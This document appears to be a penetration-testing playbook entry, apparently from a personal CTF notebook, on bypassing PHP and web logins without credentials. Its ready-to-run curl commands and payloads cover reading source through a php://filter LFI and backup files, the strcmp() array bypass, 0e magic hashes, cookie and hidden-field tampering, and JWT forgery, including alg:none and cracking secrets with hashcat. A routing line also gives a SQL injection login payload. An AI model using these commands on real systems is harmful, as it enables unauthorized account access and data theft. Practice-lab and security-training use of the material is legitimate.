## Goal
Get past a login **without valid credentials** by abusing loose comparisons, PHP type juggling, or parameter/token tampering — the path you take when the login is not SQL-injectable and defaults/reuse have failed.

## Reach for this when
- A login where SQLi (`[[sqli]]`), product defaults and credential reuse (`[[default_creds_logins]]`) have all failed
- It is a PHP app (`.php`), or you can read the auth source (LFI / `.bak` / exposed `.git`) and see `==`, `strcmp(...)`, or `md5(...) ==`
- A hidden field or cookie looks like a role/state flag (`admin=0`, `isAdmin=false`, `auth=0`)

## Required access
- Unauthenticated — this **is** the login bypass.

## Tips
You usually need to **see the comparison** first. Pull source with `[[lfi_rfi]]` (php filter → base64), a backup file (`[[00_recon_dirbrute]]`), or an exposed `.git`. The move is almost always to send a value the app mis-handles — an **array** (`param[]`) or a JSON int/null — which a browser form can't do, so drive it from **Burp or curl**.

**Checklist**
- [ ] can I read the auth source? (LFI / `.bak` / `.git`)
- [ ] loose compare `==` or `strcmp()`? → array trick / type juggle
- [ ] password hashed then `==` compared? → magic hash (`0e`)
- [ ] hidden field / cookie encodes a role or flag? → tamper it
- [ ] a `eyJ...` JWT in the request? → **decode & classify first** (Case 5), then `alg:none` / weak secret / alg-confusion

# Commands

### Step 1: Get the auth source (so you know the bug)
```bash
# via LFI (php filter -> base64 -> decode):
curl -s "http://$IP/?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d
# via backup / editor swap file:
curl -s http://$IP/index.php.bak  http://$IP/login.php~  http://$IP/.index.php.swp
# exposed .git -> dump the repo (see [[00_recon_dirbrute]])
```

### Step 2: Capture the login POST
```bash
# browsers can't send arrays / JSON ints / null -> use Burp or curl.
# proxy the login once, then replay/modify the raw request.
POST /index.php?login=1
username=admin&password=x
```

## Exploit

### Case 1: strcmp() array bypass
Source shows `if (strcmp($_POST['password'], $pass) == 0)` (or `==` on a `strcmp`/`in_array` result).
```bash
# make the param an ARRAY -> strcmp() returns NULL -> loose  NULL == 0  is TRUE
curl -s "http://$IP/index.php?login=1" --data "username=admin&password[]="
# Burp:      password=x        ->  password[]=
# Inspector: name="password"   ->  name="password[]"  then submit
```
Success signal: "Welcome" / redirect / a session cookie is set instead of "Bad login".

### Case 2: PHP type juggling — magic hash (`0e`)
Source shows `md5($_POST['password']) == $hash` (loose `==`, stored hash begins `0e`).
```bash
# "0e<digits>" == "0e<digits>"  -> both parsed as 0.0 (scientific notation) -> equal
# known md5 magic-hash plaintext:  240610708  ->  0e462097431906509019562988736854
curl -s "http://$IP/login.php" --data "username=admin&password=240610708"
# sha1 magic-hash plaintext:  10932435112     (search "magic hashes" for the full list)
```

### Case 3: Loose compare / value juggling
`if ($_POST['pass'] == $real)` with `==`, or a `== 0` / bool check (PHP < 8: `"anything" == 0` is TRUE).
```bash
# send an int / bool where a string is expected (JSON API):
curl -s http://$IP/api/login -H 'Content-Type: application/json' \
  --data '{"username":"admin","password":0}'
curl -s http://$IP/api/login -H 'Content-Type: application/json' \
  --data '{"username":"admin","password":true}'
```

### Case 4: Hidden field / cookie tampering
A param or cookie encodes a role or state (`admin=0`, `role=user`, `isAdmin=false`, `auth=0`).
```bash
curl -s http://$IP/panel -b "role=admin; auth=1"
curl -s "http://$IP/?admin=1"
# base64/hex cookie? decode -> flip the value -> re-encode -> resend
```

### Case 5: JWT — decode & classify first, then bypass
A `eyJ...` token in a cookie/header. **Decode and understand it before tampering** — most JWT time is wasted attacking the wrong thing.

**Step A — decode (read-only; claims are attacker-visible, not attacker-trusted):**
```bash
# a JWT is 3 base64url parts: header.payload.signature — ENCODED + SIGNED, NOT encrypted.
echo '<header>'  | base64 -d 2>/dev/null      # {"alg":"HS256","typ":"JWT"}
echo '<payload>' | base64 -d 2>/dev/null      # {"sub":...,"role":...,"iss":...,"exp":...}
# (pad with = if base64 complains; or use jwt_tool / an online decoder you trust)
```
Anyone can read the payload — so don't treat a token as a secret, and don't assume its claims are validated server-side.

**Step B — inspect and classify what you're actually facing:**
| Look at | Question | If yes → |
|---|---|---|
| `alg` | `none`? or symmetric `HS256` vs asymmetric `RS256`? | `none`/confusion candidate |
| signature | present + verified server-side? | if not verified → tamper freely |
| `role`/`sub`/`isAdmin` | a privilege claim you'd want to flip? | authorization target |
| secret exposure | is the signing key in JS/source/repo/config? | sign your own token directly |
| `iss`/`aud`/`exp` | expired? wrong audience accepted? | logic/authorization flaw |

Four *different* problems — pick the one the evidence supports, don't spray:
- **Exposed information** — the token leaked something (an internal id, an email). Use it; no attack needed.
- **Signature not verified / `alg:none`** — server trusts an unsigned/none token → forge claims.
- **Weak symmetric secret** — HS256 with a crackable key → crack, then re-sign.
- **Algorithm confusion** (RS256→HS256) — server verifies an HS256 token using the *public* key as the secret.
- **Pure authorization failure** — flipping a claim works only if the server doesn't re-check server-side.

**Step C — act on the classified finding (existing payloads):**
```bash
# signature not verified / alg:none -> set header {"alg":"none","typ":"JWT"}, edit payload (role/user), empty signature
# weak HS256 secret -> crack, then re-sign with the recovered key:
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
# jwt_tool automates decode / tamper / crack / alg-confusion tests:
python3 jwt_tool.py <token>
```
> [!warning] Classify before tampering
> Don't try `alg:none` or start cracking until you've decoded the token and have *evidence* of which weakness applies. **Success** = the server accepts your modified token and grants the new identity/role; **failure** = signature-invalid / rejected → your hypothesis about the trust model is wrong, reclassify.

## Helpline
```text
strcmp[]  : strcmp(array,string) errors -> returns NULL; loose  NULL == 0  is TRUE.
            same idea beats  ==  on strcmp/in_array results and any  X == 0  check.
magic 0e  : PHP loose ==  treats "0e123" as 0.0, so two 0e-hashes compare equal.
            ONLY when the app HASHES then compares with  ==   ( ===  is safe ).
source    : get it first (LFI / .bak / .git); guess only if the login screams PHP.
transport : browsers can't send  password[]  / JSON int / null  -> Burp or curl.
STOP if   : not PHP, uses  === , or it's an ASP.NET/Java login -> this class won't apply, move on.
```

**Routing:** SQL login bypass (`' OR 1=1-- -`) → [[sqli]] · defaults & reuse → [[default_creds_logins]] · read the source via [[lfi_rfi]] / [[00_recon_dirbrute]] · after you're in the panel, hunt upload / template-edit / LFI for RCE → [[00_FOOTHOLD]].

## Lessons From Practice Boxes

> [!tip] Potato — strcmp() array bypass
> **Transferable rule:** when login source shows a loose comparison (`==`, `strcmp(...) == 0`), send the credential parameter as an array (`password[]`). The function returns `NULL`, and `NULL == 0` passes.
> **Seen on:** `index.php.bak` grabbed from anonymous FTP revealed `strcmp($_POST['password'],$pass)==0`; submitting `password[]` bypassed the login, and a file parameter on the next page gave LFI → `/etc/passwd`.
